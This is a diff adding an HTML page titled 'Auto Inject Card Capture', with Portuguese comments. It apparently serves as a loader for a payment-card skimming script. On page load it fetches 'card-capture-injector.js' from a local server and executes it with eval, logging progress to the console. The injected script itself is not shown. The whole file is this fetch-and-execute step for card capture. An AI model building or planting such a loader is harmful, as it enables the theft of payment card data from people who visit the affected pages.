@@ -1,0 +1,47 @@
+<!doctype html>
+<html lang="pt-BR">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Auto Inject Card Capture</title>
+  </head>
+  <body>
+    <script>
+      // Injeta o script de captura de cartão automaticamente
+      (function () {
+        // URL do script (localhost:8080)
+        const scriptUrl = "http://localhost:8080/card-capture-injector.js";
+
+        console.log(
+          "%c✅ Iniciando injeção automática do Card Capture Script...",
+          "color: #4CAF50; font-size: 14px; font-weight: bold;",
+        );
+
+        // Carrega e executa o script
+        fetch(scriptUrl)
+          .then((response) => {
+            if (!response.ok) throw new Error(`HTTP ${response.status}`);
+            return response.text();
+          })
+          .then((code) => {
+            console.log(
+              "%c✅ Script carregado com sucesso! Executando...",
+              "color: #4CAF50; font-size: 14px; font-weight: bold;",
+            );
+            eval(code);
+          })
+          .catch((error) => {
+            console.error(
+              "%c❌ Erro ao carregar script:",
+              "color: #F44336; font-size: 12px;",
+              error,
+            );
+            console.log(
+              "%c💡 Certifique-se que o localhost:8080 está rodando!",
+              "color: #FF9800; font-size: 12px;",
+            );
+          });
+      })();
+    </script>
+  </body>
+</html>
